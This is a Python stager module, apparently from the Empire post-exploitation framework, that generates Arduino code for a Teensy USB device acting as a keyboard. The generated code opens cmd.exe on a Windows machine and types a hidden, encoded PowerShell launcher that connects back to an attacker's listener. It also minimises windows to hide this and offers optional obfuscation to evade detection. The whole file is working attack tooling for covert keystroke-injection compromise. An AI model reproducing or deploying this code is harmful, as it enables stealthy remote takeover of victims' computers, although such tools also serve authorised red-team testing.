from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'TeensyLauncher',

            'Author': ['@matterpreter'],

            'Description': ('Generates a Teensy script that runes a one-liner stage0 launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to.',
                'Required'      :   True,
                'Value'         :   '/tmp/teensy.ino'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']

        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        elif obfuscate and "launcher" in obfuscateCommand.lower():
            print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the teensy stager.")
            return ""
        else:
            enc = launcher.split(" ")[-1]
            sendEnc = "Keyboard.print(\""
            sendEnc += enc
            sendEnc += "\");\n"
            teensyCode = "unsigned int lock_check_wait = 1000;\n"
            teensyCode += "int ledKeys(void) {return int(keyboard_leds);}\n"
            teensyCode += "boolean isLockOn(void)  {\n"
            teensyCode += "    return ((ledKeys() & 2) == 2) ? true : false;\n"
            teensyCode += "}\n\n"
            teensyCode +=  "void clearKeys (){\n"
            teensyCode += "    delay(200);\n"
            teensyCode += "    Keyboard.set_key1(0);\n"
            teensyCode += "    Keyboard.set_key2(0);\n"
            teensyCode += "    Keyboard.set_key3(0);\n"
            teensyCode += "    Keyboard.set_key4(0);\n"
            teensyCode += "    Keyboard.set_key5(0);\n"
            teensyCode += "    Keyboard.set_key6(0);\n"
            teensyCode += "    Keyboard.set_modifier(0);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "}\n\n"
            teensyCode += "void toggleLock(void) {\n"
            teensyCode += "    Keyboard.set_key1(KEY_CAPS_LOCK);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void wait_for_drivers(void) {\n"
            teensyCode += "    boolean numLockTrap = isLockOn();\n"
            teensyCode += "    while(numLockTrap == isLockOn()) {\n"
            teensyCode += "        toggleLock();\n"
            teensyCode += "        delay(lock_check_wait);\n"
            teensyCode += "    }\n"
            teensyCode += "    toggleLock();\n"
            teensyCode += "    delay(lock_check_wait);\n"
            teensyCode += "}\n\n"
            teensyCode += "void win_minWindows(void) {\n"
            teensyCode += "    delay(300);\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensyCode += "    Keyboard.set_key1(KEY_M);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void win_restoreWindows(void) {\n"
            teensyCode += "    delay(300);\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_SHIFT);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    Keyboard.set_key1(KEY_M);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void win_run(void) {\n"
            teensyCode += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensyCode += "    Keyboard.set_key1(KEY_R);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void win_openCmd(void) {\n"
            teensyCode += "    delay(300);\n"
            teensyCode += "    win_run();\n"
            teensyCode += "    Keyboard.print(\"cmd.exe\");\n"
            teensyCode += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "}\n\n"
            teensyCode += "void empire(void) {\n"
            teensyCode += "    wait_for_drivers();\n"
            teensyCode += "    win_minWindows();\n"
            teensyCode += "    delay(1000);\n"
            teensyCode += "    win_openCmd();\n"
            teensyCode += "    delay(1000);\n"
            teensyCode += "    Keyboard.print(\"powershell -W Hidden -nop -noni -enc \");\n"
            teensyCode += "    "
            teensyCode += sendEnc
            teensyCode += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensyCode += "    Keyboard.send_now();\n"
            teensyCode += "    clearKeys();\n"
            teensyCode += "    win_restoreWindows();\n"
            teensyCode += "}\n\n"
            teensyCode += "void setup(void) {\n"
            teensyCode += "    empire();\n"
            teensyCode += "}\n\n"
            teensyCode += "void loop() {}"

            return teensyCode
